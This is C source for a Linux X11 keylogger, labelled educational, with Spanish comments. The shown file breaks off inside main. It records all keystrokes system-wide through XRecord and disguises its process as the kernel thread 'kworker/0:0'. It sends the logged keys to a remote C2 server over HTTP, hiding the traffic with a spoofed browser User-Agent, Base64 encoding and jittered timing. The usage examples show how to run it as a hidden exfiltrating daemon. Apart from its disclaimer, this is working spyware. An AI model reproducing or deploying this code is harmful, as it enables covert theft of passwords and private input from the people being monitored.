/*
 * X11 Educational Keylogger
 * 
 * AVISO LEGAL Y ÉTICO:
 * Este programa es solo para propósitos educativos y de investigación.
 * Demuestra las vulnerabilidades inherentes del protocolo X11 en sistemas Linux.
 * El uso no autorizado de este software puede ser ilegal.
 * Use solo en sistemas propios o con permiso explícito.
 * 
 * Este keylogger demuestra cómo cualquier aplicación en X11 puede capturar
 * eventos de teclado de otras aplicaciones sin necesidad de privilegios elevados,
 * una vulnerabilidad fundamental del diseño de X11 desde 1984.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <X11/keysym.h>
#include <X11/XKBlib.h>
#include <X11/extensions/record.h>
#include <time.h>
#include <signal.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/prctl.h>
#include <getopt.h>

// Includes para exfiltración de red
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>

#define LOG_FILE "keylog.txt"
#define MAX_WINDOW_NAME 256
#define DAEMON_PROCESS_NAME "kworker/0:0"  // Nombre que simula un proceso del kernel

// Constantes de exfiltración
#define EXFIL_BUFFER_SIZE 8192
#define EXFIL_INTERVAL_MIN 45   // Segundos mínimo entre envíos
#define EXFIL_INTERVAL_MAX 75   // Segundos máximo (jitter para evasión)
#define EXFIL_MAX_RETRIES 3
#define EXFIL_DEFAULT_PORT "8080"
#define EXFIL_DEFAULT_PATH "/upload"
// User-Agent que simula Firefox en Linux para evadir detección
#define EXFIL_USER_AGENT "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

/**
 * Estructura para el estado de exfiltración HTTP.
 * Permite enviar datos capturados a un servidor C2 remoto.
 */
typedef struct {
    int enabled;                          // Flag para activar exfiltración
    char server[256];                     // IP o hostname del servidor C2
    char port[16];                        // Puerto del servidor
    char path[256];                       // Path del endpoint (ej: /upload)
    pthread_t thread;                     // Thread de exfiltración
    pthread_mutex_t buffer_mutex;         // Mutex para sincronización del buffer
    char buffer[EXFIL_BUFFER_SIZE];       // Buffer de datos a exfiltrar
    size_t buffer_len;                    // Longitud actual del buffer
    volatile int thread_running;          // Flag para control del thread
} ExfilState;

// Estructura para encapsular el estado del keylogger
typedef struct {
    Display *display;
    Display *record_display;
    FILE *logfile;
    XRecordContext record_context;
    volatile sig_atomic_t running;
    int daemon_mode;
    int quiet_mode;
    char log_filename[256];
    char last_window[MAX_WINDOW_NAME];
    char display_env[64];  // Guardar DISPLAY para uso después de daemonizar
    ExfilState exfil;      // Estado de exfiltración
} KeyloggerState;

// Estado global del keylogger
static KeyloggerState g_state = {
    .display = NULL,
    .record_display = NULL,
    .logfile = NULL,
    .record_context = 0,
    .running = 1,
    .daemon_mode = 0,
    .quiet_mode = 0,
    .log_filename = LOG_FILE,
    .last_window = {0},
    .display_env = {0},
    .exfil = {
        .enabled = 0,
        .server = {0},
        .port = EXFIL_DEFAULT_PORT,
        .path = EXFIL_DEFAULT_PATH,
        .thread = 0,
        .buffer = {0},
        .buffer_len = 0,
        .thread_running = 0
    }
};

// Manejador de señales para limpieza
void signal_handler(int signum) {
    (void)signum; // Parámetro requerido pero no usado
    g_state.running = 0;
    if (!g_state.quiet_mode && !g_state.daemon_mode) {
        printf("\n[!] Deteniendo keylogger...\n");
    }
}

// Obtener el nombre de la ventana activa
char* get_window_name(Display *display, Window window) {
    static char window_name[MAX_WINDOW_NAME];
    char *name = NULL;
    
    if (window == None) {
        strncpy(window_name, "Unknown", MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
        return window_name;
    }
    
    if (XFetchName(display, window, &name) && name) {
        strncpy(window_name, name, MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
        XFree(name);
    } else {
        strncpy(window_name, "Unnamed Window", MAX_WINDOW_NAME - 1);
        window_name[MAX_WINDOW_NAME - 1] = '\0';
    }
    
    return window_name;
}

// Obtener la ventana con foco actual
Window get_focused_window(Display *display) {
    Window focused;
    int revert;
    
    XGetInputFocus(display, &focused, &revert);
    
    // Si es la ventana raíz o PointerRoot, intentar obtener la ventana real
    if (focused == None || focused == PointerRoot) {
        Window root = DefaultRootWindow(display);
        Window parent, *children;
        unsigned int nchildren;
        
        if (XQueryTree(display, root, &root, &parent, &children, &nchildren)) {
            if (nchildren > 0) {
                focused = children[nchildren - 1];
            }
            if (children) XFree(children);
        }
    }
    
    return focused;
}

// Convertir KeySym a string legible
const char* keysym_to_string(KeySym keysym) {
    static char buffer[32];
    
    // Teclas especiales
    switch(keysym) {
        case XK_Return: return "[ENTER]";
        case XK_BackSpace: return "[BACKSPACE]";
        case XK_Tab: return "[TAB]";
        case XK_Escape: return "[ESC]";
        case XK_Delete: return "[DELETE]";
        case XK_Home: return "[HOME]";
        case XK_End: return "[END]";
        case XK_Page_Up: return "[PGUP]";
        case XK_Page_Down: return "[PGDN]";
        case XK_Left: return "[LEFT]";
        case XK_Right: return "[RIGHT]";
        case XK_Up: return "[UP]";
        case XK_Down: return "[DOWN]";
        case XK_space: return " ";
        case XK_Shift_L:
        case XK_Shift_R: return "[SHIFT]";
        case XK_Control_L:
        case XK_Control_R: return "[CTRL]";
        case XK_Alt_L:
        case XK_Alt_R: return "[ALT]";
        case XK_Caps_Lock: return "[CAPS]";
        case XK_F1: return "[F1]";
        case XK_F2: return "[F2]";
        case XK_F3: return "[F3]";
        case XK_F4: return "[F4]";
        case XK_F5: return "[F5]";
        case XK_F6: return "[F6]";
        case XK_F7: return "[F7]";
        case XK_F8: return "[F8]";
        case XK_F9: return "[F9]";
        case XK_F10: return "[F10]";
        case XK_F11: return "[F11]";
        case XK_F12: return "[F12]";
        default: {
            char *str = XKeysymToString(keysym);
            if (str && strlen(str) == 1) {
                buffer[0] = str[0];
                buffer[1] = '\0';
                return buffer;
            } else if (str) {
                snprintf(buffer, sizeof(buffer), "[%s]", str);
                return buffer;
            }
            return "[UNKNOWN]";
        }
    }
}

// Obtener timestamp
void get_timestamp(char *buffer, size_t size) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    strftime(buffer, size, "%Y-%m-%d %H:%M:%S", t);
}

// ============================================================================
// FUNCIONES DE EXFILTRACIÓN
// ============================================================================

// Tabla de caracteres Base64
static const char base64_table[] = 
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/**
 * Codifica datos en Base64 para evadir detección por firmas de texto plano.
 * 
 * @param input Datos a codificar
 * @param input_len Longitud de los datos de entrada
 * @param output Buffer de salida (debe tener al menos (input_len * 4/3) + 4 bytes)
 * @param output_size Tamaño del buffer de salida
 * @return Longitud de la cadena codificada, o -1 en error
 */
int exfil_base64_encode(const unsigned char *input, size_t input_len, 
                        char *output, size_t output_size) {
    size_t i, j;
    size_t output_len = 4 * ((input_len + 2) / 3);
    
    if (output_size < output_len + 1) {
        return -1;  // Buffer muy pequeño
    }
    
    for (i = 0, j = 0; i < input_len;) {
        uint32_t octet_a = i < input_len ? input[i++] : 0;
        uint32_t octet_b = i < input_len ? input[i++] : 0;
        uint32_t octet_c = i < input_len ? input[i++] : 0;
        
        uint32_t triple = (octet_a << 16) + (octet_b << 8) + octet_c;
        
        output[j++] = base64_table[(triple >> 18) & 0x3F];
        output[j++] = base64_table[(triple >> 12) & 0x3F];
        output[j++] = base64_table[(triple >> 6) & 0x3F];
        output[j++] = base64_table[triple & 0x3F];
    }
    
    // Padding con '='
    size_t mod = input_len % 3;
    if (mod > 0) {
        output[output_len - 1] = '=';
        if (mod == 1) {
            output[output_len - 2] = '=';
        }
    }
    
    output[output_len] = '\0';
    return (int)output_len;
}

/**
 * Envía datos al servidor C2 mediante HTTP POST.
 * Implementa técnicas de evasión: User-Agent spoofing y codificación Base64.
 * 
 * @param server Hostname o IP del servidor
 * @param port Puerto del servidor
 * @param path Path del endpoint (ej: /upload)
 * @param data Datos a enviar (ya codificados en base64)
 * @param data_len Longitud de los datos
 * @return 0 en éxito, -1 en error
 */
int exfil_http_post(const char *server, const char *port, 
                    const char *path, const char *data, size_t data_len) {
    struct addrinfo hints, *result, *rp;
    int sockfd = -1;
    int ret;
    char request[EXFIL_BUFFER_SIZE + 512];
    char response[256];
    
    // Configurar hints para getaddrinfo
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;      // IPv4 o IPv6
    hints.ai_socktype = SOCK_STREAM;  // TCP
    
    // Resolver hostname
    ret = getaddrinfo(server, port, &hints, &result);
    if (ret != 0) {
        return -1;  // Error de resolución DNS
    }
    
    // Intentar conectar a cada dirección
    for (rp = result; rp != NULL; rp = rp->ai_next) {
        sockfd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
        if (sockfd == -1) {
            continue;
        }
        
        // Configurar timeout de conexión
        struct timeval tv;
        tv.tv_sec = 10;
        tv.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        if (connect(sockfd, rp->ai_addr, rp->ai_addrlen) != -1) {
            break;  // Conexión exitosa
        }
        
        close(sockfd);
        sockfd = -1;
    }
    
    freeaddrinfo(result);
    
    if (sockfd == -1) {
        return -1;  // No se pudo conectar
    }
    
    // Construir request HTTP POST con User-Agent spoofing
    int request_len = snprintf(request, sizeof(request),
        "POST %s HTTP/1.1\r\n"
        "Host: %s:%s\r\n"
        "User-Agent: %s\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "data=%.*s",
        path, server, port, EXFIL_USER_AGENT, 
        data_len + 5,  // +5 por "data="
        (int)data_len, data);
    
    // Enviar request
    ssize_t sent = send(sockfd, request, request_len, 0);
    if (sent < 0) {
        close(sockfd);
        return -1;
    }
    
    // Leer respuesta (para verificar éxito, opcional)
    ssize_t received = recv(sockfd, response, sizeof(response) - 1, 0);
    if (received > 0) {
        response[received] = '\0';
        // Verificar código de respuesta HTTP (200 OK, etc.)
        // No es crítico si falla, los datos ya fueron enviados
    }
    
    close(sockfd);
    return 0;
}

/**
 * Agrega datos al buffer de exfiltración de forma thread-safe.
 * Si el buffer está lleno, los datos más antiguos se descartan.
 * 
 * @param data Datos a agregar
 * @param len Longitud de los datos
 */
void exfil_add_to_buffer(const char *data, size_t len) {
    if (!g_state.exfil.enabled || len == 0) {
        return;
    }
    
    pthread_mutex_lock(&g_state.exfil.buffer_mutex);
    
    // Verificar si hay espacio en el buffer
    size_t space_left = EXFIL_BUFFER_SIZE - g_state.exfil.buffer_len - 1;
    
    if (len > space_left) {
        // Buffer lleno, truncar los datos
        len = space_left;
    }
    
    if (len > 0) {
        memcpy(g_state.exfil.buffer + g_state.exfil.buffer_len, data, len);
        g_state.exfil.buffer_len += len;
        g_state.exfil.buffer[g_state.exfil.buffer_len] = '\0';
    }
    
    pthread_mutex_unlock(&g_state.exfil.buffer_mutex);
}

/**
 * Obtiene un intervalo aleatorio con jitter para evadir detección por patrones.
 * Retorna un valor entre EXFIL_INTERVAL_MIN y EXFIL_INTERVAL_MAX.
 * 
 * @return Segundos a esperar antes del próximo envío
 */
int exfil_get_jitter_interval(void) {
    // Inicializar semilla solo una vez
    static int seeded = 0;
    if (!seeded) {
        srand((unsigned int)time(NULL) ^ (unsigned int)getpid());
        seeded = 1;
    }
    
    int range = EXFIL_INTERVAL_MAX - EXFIL_INTERVAL_MIN;
    return EXFIL_INTERVAL_MIN + (rand() % (range + 1));
}

/**
 * Thread principal de exfiltración.
 * Ejecuta en background, enviando datos periódicamente con jitter.
 * Implementa reintentos con backoff exponencial en caso de fallo.
 * 
 * @param arg No utilizado
 * @return NULL
 */
void* exfil_thread_func(void *arg) {
    (void)arg;
    
    char send_buffer[EXFIL_BUFFER_SIZE];
    char base64_buffer[EXFIL_BUFFER_SIZE * 2];  // Base64 expande ~33%
    size_t send_len;
    int retries;
    int backoff;
    
    while (g_state.running && g_state.exfil.thread_running) {
        // Esperar con jitter
        int wait_time = exfil_get_jitter_interval();
        
        // Dormir en intervalos pequeños para poder detectar señal de terminación
        for (int i = 0; i < wait_time && g_state.running && g_state.exfil.thread_running; i++) {
            sleep(1);
        }
        
        if (!g_state.running || !g_state.exfil.thread_running) {
            break;
        }
        
        // Obtener datos del buffer
        pthread_mutex_lock(&g_state.exfil.buffer_mutex);
        
        if (g_state.exfil.buffer_len == 0) {
            pthread_mutex_unlock(&g_state.exfil.buffer_mutex);
            continue;  // Nada que enviar
        }
        
        // Copiar y vaciar buffer
        send_len = g_state.exfil.buffer_len;
        memcpy(send_buffer, g_state.exfil.buffer, send_len);
        send_buffer[send_len] = '\0';
        g_state.exfil.buffer_len = 0;
        g_state.exfil.buffer[0] = '\0';
        
        pthread_mutex_unlock(&g_state.exfil.buffer_mutex);
        
        // Codificar en Base64 para evadir detección por firmas
        int base64_len = exfil_base64_encode(
            (unsigned char *)send_buffer, send_len,
            base64_buffer, sizeof(base64_buffer)
        );
        
        if (base64_len < 0) {
            continue;  // Error de codificación, descartar
        }
        
        // Intentar enviar con reintentos y backoff exponencial
        retries = 0;
        backoff = 1;
        
        while (retries < EXFIL_MAX_RETRIES) {
            int result = exfil_http_post(
                g_state.exfil.server,
                g_state.exfil.port,
                g_state.exfil.path,
                base64_buffer,
                (size_t)base64_len
            );
            
            if (result == 0) {
                // Éxito
                break;
            }
            
            // Fallo: esperar con backoff exponencial antes de reintentar
            retries++;
            if (retries < EXFIL_MAX_RETRIES) {
                sleep(backoff);
                backoff *= 2;  // Duplicar tiempo de espera
            }
        }
    }
    
    return NULL;
}

/**
 * Inicializa el subsistema de exfiltración.
 * Crea el mutex y lanza el thread de exfiltración.
 * 
 * @return 0 en éxito, -1 en error
 */
int init_exfiltration(void) {
    if (!g_state.exfil.enabled) {
        return 0;  // Exfiltración deshabilitada, nada que hacer
    }
    
    // Validar configuración
    if (g_state.exfil.server[0] == '\0') {
        return -1;  // Servidor no configurado
    }
    
    // Inicializar mutex
    if (pthread_mutex_init(&g_state.exfil.buffer_mutex, NULL) != 0) {
        return -1;
    }
    
    // Marcar thread como activo
    g_state.exfil.thread_running = 1;
    
    // Crear thread de exfiltración
    if (pthread_create(&g_state.exfil.thread, NULL, exfil_thread_func, NULL) != 0) {
        pthread_mutex_destroy(&g_state.exfil.buffer_mutex);
        g_state.exfil.thread_running = 0;
        return -1;
    }
    
    return 0;
}

/**
 * Limpia los recursos del subsistema de exfiltración.
 * Envía los datos pendientes antes de terminar.
 */
void cleanup_exfiltration(void) {
    if (!g_state.exfil.enabled) {
        return;
    }
    
    // Señalar al thread que debe terminar
    g_state.exfil.thread_running = 0;
    
    // Esperar a que el thread termine
    if (g_state.exfil.thread != 0) {
        pthread_join(g_state.exfil.thread, NULL);
        g_state.exfil.thread = 0;
    }
    
    // Intentar enviar datos pendientes una última vez
    if (g_state.exfil.buffer_len > 0) {
        char base64_buffer[EXFIL_BUFFER_SIZE * 2];
        int base64_len = exfil_base64_encode(
            (unsigned char *)g_state.exfil.buffer, 
            g_state.exfil.buffer_len,
            base64_buffer, sizeof(base64_buffer)
        );
        
        if (base64_len > 0) {
            exfil_http_post(
                g_state.exfil.server,
                g_state.exfil.port,
                g_state.exfil.path,
                base64_buffer,
                (size_t)base64_len
            );
        }
    }
    
    // Destruir mutex
    pthread_mutex_destroy(&g_state.exfil.buffer_mutex);
}

// ============================================================================
// FIN FUNCIONES DE EXFILTRACIÓN
// ============================================================================

// Registrar evento de tecla
void log_key_event(const char *window_name, const char *key_str) {
    char timestamp[64];
    char log_line[512];
    
    get_timestamp(timestamp, sizeof(timestamp));
    
    // Formatear línea de log
    int log_len = snprintf(log_line, sizeof(log_line), 
                          "[%s] [%s] %s\n", timestamp, window_name, key_str);
    
    // Escribir en archivo
    if (g_state.logfile) {
        fprintf(g_state.logfile, "%s", log_line);
        fflush(g_state.logfile);
    }
    
    // Agregar al buffer de exfiltración si está habilitado
    if (g_state.exfil.enabled && log_len > 0) {
        exfil_add_to_buffer(log_line, (size_t)log_len);
    }
    
    // Mostrar en consola solo si no está en modo silencioso/daemon
    if (!g_state.quiet_mode && !g_state.daemon_mode) {
        printf("%s", log_line);
    }
}

// Callback para XRecord - aquí se procesan los eventos capturados
void record_callback(XPointer closure, XRecordInterceptData *recorded_data) {
    (void)closure; // No usado
    
    if (recorded_data->category == XRecordFromServer) {
        // Obtener el tipo de evento
        int event_type = recorded_data->data[0];
        
        // Solo procesar eventos KeyPress (tipo 2)
        if (event_type == KeyPress) {
            // Extraer el keycode del evento
            unsigned char keycode = recorded_data->data[1];
            
            // Obtener ventana con foco
            Window focused = get_focused_window(g_state.display);
            char *window_name = get_window_name(g_state.display, focused);
            
            // Convertir keycode a keysym usando XkbKeycodeToKeysym (reemplaza función deprecada)
            KeySym keysym = XkbKeycodeToKeysym(g_state.display, keycode, 0, 0);
            const char *key_str = keysym_to_string(keysym);
            
            // Detectar cambio de ventana (usando buffer estático en g_state)
            if (g_state.last_window[0] == '\0' || strcmp(g_state.last_window, window_name) != 0) {
                char window_change_msg[512];
                snprintf(window_change_msg, sizeof(window_change_msg), 
                        "\n--- Ventana activa: %s ---\n", window_name);
                if (g_state.logfile) {
                    fprintf(g_state.logfile, "%s", window_change_msg);
                    fflush(g_state.logfile);
                }
                if (!g_state.quiet_mode && !g_state.daemon_mode) {
                    printf("%s", window_change_msg);
                }
                // Copiar el nombre de ventana de forma segura
                strncpy(g_state.last_window, window_name, MAX_WINDOW_NAME - 1);
                g_state.last_window[MAX_WINDOW_NAME - 1] = '\0';
            }
            
            log_key_event(window_name, key_str);
        }
    }
    
    // IMPORTANTE: Liberar los datos grabados
    XRecordFreeData(recorded_data);
}

/**
 * Convierte un path relativo a absoluto.
 * Si ya es absoluto, lo copia sin cambios.
 */
void make_absolute_path(char *dest, const char *src, size_t dest_size) {
    if (src[0] == '/') {
        // Ya es absoluto
        strncpy(dest, src, dest_size - 1);
        dest[dest_size - 1] = '\0';
    } else {
        // Convertir a absoluto
        char cwd[256];
        if (getcwd(cwd, sizeof(cwd)) != NULL) {
            snprintf(dest, dest_size, "%s/%s", cwd, src);
        } else {
            // Fallback: usar /tmp si no podemos obtener cwd
            snprintf(dest, dest_size, "/tmp/%s", src);
        }
    }
}

/**
 * Daemoniza el proceso para ejecutarse en segundo plano.
 * - Hace fork() para desacoplar del terminal padre
 * - Crea nueva sesión con setsid()
 * - Cambia el nombre del proceso para ocultarlo
 * - Cierra stdin/stdout/stderr
 * 
 * @return 0 si es el proceso hijo (daemon), -1 en error, >0 si es el padre
 */
int daemonize(void) {
    pid_t pid;
    
    // Convertir log_filename a path absoluto ANTES de cambiar directorio
    char abs_log[256];
    make_absolute_path(abs_log, g_state.log_filename, sizeof(abs_log));
    strncpy(g_state.log_filename, abs_log, sizeof(g_state.log_filename) - 1);
    g_state.log_filename[sizeof(g_state.log_filename) - 1] = '\0';
    
    // Primer fork: el padre termina, el hijo continúa
    pid = fork();
    if (pid < 0) {
        return -1;  // Error en fork
    }
    if (pid > 0) {
        // Proceso padre: mostrar info y terminar
        printf("[*] Daemon iniciándose en segundo plano...\n");
        printf("[*] Log: %s\n", g_state.log_filename);
        printf("[*] Para encontrar el PID: ps -eo pid,ppid,comm | grep kworker\n");
        printf("[*] Para detener: pkill -f \"kworker/0:0\" (buscar PPID != 2)\n");
        exit(0);
    }
    
    // Crear nueva sesión (desacoplar del terminal)
    if (setsid() < 0) {
        return -1;
    }
    
    // Segundo fork: previene que el daemon adquiera un terminal de control
    pid = fork();
    if (pid < 0) {
        return -1;
    }
    if (pid > 0) {
        exit(0);  // El primer hijo termina
    }
    
    // Ahora somos el daemon real (nieto del proceso original)
    
    // Cambiar el nombre del proceso para ocultarlo
    // Esto hace que aparezca como un proceso del sistema en `ps` y `top`
    if (prctl(PR_SET_NAME, DAEMON_PROCESS_NAME, 0, 0, 0) < 0) {
        // No es crítico si falla, continuamos
    }
    
    // NO cambiar directorio a raíz para evitar problemas con paths
    // El log ya tiene path absoluto
    
    // Establecer máscara de permisos
    umask(0);
    
    // Cerrar descriptores de archivo estándar
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Redirigir stdin/stdout/stderr a /dev/null
    int fd = open("/dev/null", O_RDWR);
    if (fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > STDERR_FILENO) {
            close(fd);
        }
    }
    
    return 0;  // Éxito, somos el daemon
}

/**
 * Limpia todos los recursos del keylogger.
 * Centraliza la lógica de limpieza para evitar duplicación.
 */
void cleanup_resources(void) {
    char timestamp[64];
    
    // Deshabilitar y liberar contexto de grabación
    if (g_state.record_context && g_state.record_display) {
        XRecordDisableContext(g_state.record_display, g_state.record_context);
        XRecordFreeContext(g_state.record_display, g_state.record_context);
        g_state.record_context = 0;
    }
    
    // Limpiar exfiltración (envía datos pendientes antes de cerrar)
    cleanup_exfiltration();
    
    // Cerrar archivo de log
    if (g_state.logfile) {
        fprintf(g_state.logfile, "\n=== Sesión finalizada ===\n");
        get_timestamp(timestamp, sizeof(timestamp));
        fprintf(g_state.logfile, "Fin: %s\n\n", timestamp);
        fclose(g_state.logfile);
        g_state.logfile = NULL;
    }
    
    // Cerrar conexiones X11
    if (g_state.display) {
        XCloseDisplay(g_state.display);
        g_state.display = NULL;
    }
    
    if (g_state.record_display) {
        XCloseDisplay(g_state.record_display);
        g_state.record_display = NULL;
    }
}

/**
 * Muestra la ayuda de uso del programa.
 */
void print_usage(const char *prog_name) {
    printf("X11 Educational Keylogger\n");
    printf("USO EDUCATIVO SOLAMENTE\n\n");
    printf("Uso: %s [opciones]\n\n", prog_name);
    printf("Opciones generales:\n");
    printf("  -d, --daemon       Ejecutar en segundo plano (oculto)\n");
    printf("  -q, --quiet        Modo silencioso (sin output a consola)\n");
    printf("  -o, --output FILE  Archivo de log (default: %s)\n", LOG_FILE);
    printf("  -h, --help         Mostrar esta ayuda\n\n");
    printf("Opciones de exfiltración (C2):\n");
    printf("  -e, --exfil            Habilitar exfiltración HTTP\n");
    printf("  -s, --server HOST      IP/hostname del servidor C2\n");
    printf("  -P, --exfil-port PORT  Puerto del servidor (default: %s)\n", EXFIL_DEFAULT_PORT);
    printf("      --exfil-path PATH  Path del endpoint (default: %s)\n\n", EXFIL_DEFAULT_PATH);
    printf("Ejemplos:\n");
    printf("  %s                              # Modo normal\n", prog_name);
    printf("  %s -d                           # Daemon oculto\n", prog_name);
    printf("  %s -d -o /tmp/k.log             # Daemon con log\n", prog_name);
    printf("  %s -d -e -s 192.168.1.100       # Daemon con exfiltración\n", prog_name);
    printf("  %s -d -e -s 10.0.0.5 -P 443     # Exfiltración por puerto 443\n", prog_name);
}

// Función principal del keylogger
int start_keylogger(void) {
    char timestamp[64];
    
    // IMPORTANTE: Guardar DISPLAY antes de daemonizar
    // Después de fork()/setsid(), el proceso pierde acceso a las variables de entorno
    const char *display_env = getenv("DISPLAY");
    if (display_env) {
        strncpy(g_state.display_env, display_env, sizeof(g_state.display_env) - 1);
        g_state.display_env[sizeof(g_state.display_env) - 1] = '\0';
    } else {
        // Valor por defecto si no está definido
        strncpy(g_state.display_env, ":0", sizeof(g_state.display_env) - 1);
    }
    
    // Si es modo daemon, daemonizar primero
    if (g_state.daemon_mode) {
        if (daemonize() < 0) {
            fprintf(stderr, "[!] Error: No se pudo daemonizar el proceso.\n");
            return 1;
        }
        // Después de daemonize(), el output va a /dev/null
        g_state.quiet_mode = 1;  // Forzar modo silencioso
    }
    
    if (!g_state.quiet_mode) {
        printf("[*] Keylogger educativo iniciado.\n");
        printf("[*] Capturando eventos de teclado en X11 usando XRecord...\n");
        printf("[*] Archivo de log: %s\n", g_state.log_filename);
        printf("[*] Presione Ctrl+C para detener.\n\n");
    }
    
    // Abrir conexión principal con X11 usando el DISPLAY guardado
    g_state.display = XOpenDisplay(g_state.display_env);
    if (g_state.display == NULL) {
        // Intentar con NULL como fallback
        g_state.display = XOpenDisplay(NULL);
        if (g_state.display == NULL) {
            if (!g_state.quiet_mode) {
                fprintf(stderr, "[!] Error: No se puede conectar al servidor X11.\n");
                fprintf(stderr, "[!] Asegúrese de estar en un entorno con X11 activo.\n");
                fprintf(stderr, "[!] DISPLAY usado: %s\n", g_state.display_env);
            }
            return 1;
        }
    }
    
    // Verificar si la extensión XRecord está disponible
    int major, minor;
    if (!XRecordQueryVersion(g_state.display, &major, &minor)) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: La extensión XRecord no está disponible.\n");
        }
        XCloseDisplay(g_state.display);
        return 1;
    }
    if (!g_state.quiet_mode) {
        printf("[*] Extensión XRecord versión %d.%d detectada.\n", major, minor);
    }
    
    // Abrir segunda conexión para la grabación (requerido por XRecord)
    g_state.record_display = XOpenDisplay(g_state.display_env);
    if (g_state.record_display == NULL) {
        // Intentar con NULL como fallback
        g_state.record_display = XOpenDisplay(NULL);
    }
    if (g_state.record_display == NULL) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede abrir segunda conexión X11.\n");
        }
        XCloseDisplay(g_state.display);
        return 1;
    }
    
    // Abrir archivo de log
    g_state.logfile = fopen(g_state.log_filename, "a");
    if (g_state.logfile == NULL) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede abrir el archivo de log.\n");
        }
        XCloseDisplay(g_state.display);
        XCloseDisplay(g_state.record_display);
        return 1;
    }
    
    // Escribir encabezado en el log
    fprintf(g_state.logfile, "\n=== Nueva sesión de keylogging ===\n");
    get_timestamp(timestamp, sizeof(timestamp));
    fprintf(g_state.logfile, "Inicio: %s\n", timestamp);
    fprintf(g_state.logfile, "Modo: %s\n", g_state.daemon_mode ? "daemon" : "normal");
    if (g_state.exfil.enabled) {
        fprintf(g_state.logfile, "Exfiltración: %s:%s%s\n", 
                g_state.exfil.server, g_state.exfil.port, g_state.exfil.path);
    }
    fprintf(g_state.logfile, "\n");
    fflush(g_state.logfile);
    
    // Inicializar exfiltración si está habilitada
    if (g_state.exfil.enabled) {
        if (init_exfiltration() < 0) {
            if (!g_state.quiet_mode) {
                fprintf(stderr, "[!] Error: No se pudo inicializar exfiltración.\n");
            }
            cleanup_resources();
            return 1;
        }
        if (!g_state.quiet_mode) {
            printf("[*] Exfiltración habilitada: %s:%s%s\n", 
                   g_state.exfil.server, g_state.exfil.port, g_state.exfil.path);
        }
    }
    
    // Configurar manejador de señales
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    signal(SIGHUP, SIG_IGN);  // Ignorar SIGHUP para daemons
    
    // Configurar el rango de eventos a capturar
    XRecordRange *record_range = XRecordAllocRange();
    if (record_range == NULL) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede asignar rango de grabación.\n");
        }
        cleanup_resources();
        return 1;
    }
    
    // Capturar solo eventos de teclado (KeyPress)
    record_range->device_events.first = KeyPress;
    record_range->device_events.last = KeyPress;
    
    // Crear contexto de grabación para todos los clientes
    XRecordClientSpec client_spec = XRecordAllClients;
    g_state.record_context = XRecordCreateContext(g_state.record_display, 0, &client_spec, 1, &record_range, 1);
    
    if (g_state.record_context == 0) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede crear contexto XRecord.\n");
        }
        XFree(record_range);
        cleanup_resources();
        return 1;
    }
    
    XFree(record_range);
    
    if (!g_state.quiet_mode) {
        printf("[*] Contexto XRecord creado. Monitoreando...\n\n");
    }
    
    // Habilitar el contexto de grabación
    if (!XRecordEnableContextAsync(g_state.record_display, g_state.record_context, record_callback, NULL)) {
        if (!g_state.quiet_mode) {
            fprintf(stderr, "[!] Error: No se puede habilitar contexto.\n");
        }
        cleanup_resources();
        return 1;
    }
    
    // Loop principal - procesar eventos XRecord
    while (g_state.running) {
        XRecordProcessReplies(g_state.record_display);
    }
    
    // Limpieza
    if (!g_state.quiet_mode) {
        printf("\n[*] Limpiando recursos...\n");
    }
    
    cleanup_resources();
    
    if (!g_state.quiet_mode) {
        printf("[*] Keylogger detenido correctamente.\n");
        printf("[*] Log guardado en: %s\n", g_state.log_filename);
    }
    
    return 0;
}

int main(int argc, char *argv[]) {
    int opt;
    int option_index = 0;
    
    // Opciones largas para getopt_long
    static struct option long_options[] = {
        {"daemon",      no_argument,       0, 'd'},
        {"quiet",       no_argument,       0, 'q'},
        {"output",      required_argument, 0, 'o'},
        {"help",        no_argument,       0, 'h'},
        // Opciones de exfiltración
        {"exfil",       no_argument,       0, 'e'},
        {"server",      required_argument, 0, 's'},
        {"exfil-port",  required_argument, 0, 'P'},
        {"exfil-path",  required_argument, 0, 256},  // Solo opción larga
        {0, 0, 0, 0}
    };
    
    // Parsear argumentos de línea de comandos
    while ((opt = getopt_long(argc, argv, "dqo:hes:P:", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'd':
                g_state.daemon_mode = 1;
                break;
            case 'q':
                g_state.quiet_mode = 1;
                break;
            case 'o':
                strncpy(g_state.log_filename, optarg, sizeof(g_state.log_filename) - 1);
                g_state.log_filename[sizeof(g_state.log_filename) - 1] = '\0';
                break;
            case 'h':
                print_usage(argv[0]);
                return 0;
            // Opciones de exfiltración
            case 'e':
                g_state.exfil.enabled = 1;
                break;
            case 's':
                strncpy(g_state.exfil.server, optarg, sizeof(g_state.exfil.server) - 1);
                g_state.exfil.server[sizeof(g_state.exfil.server) - 1] = '\0';
                break;
            case 'P':
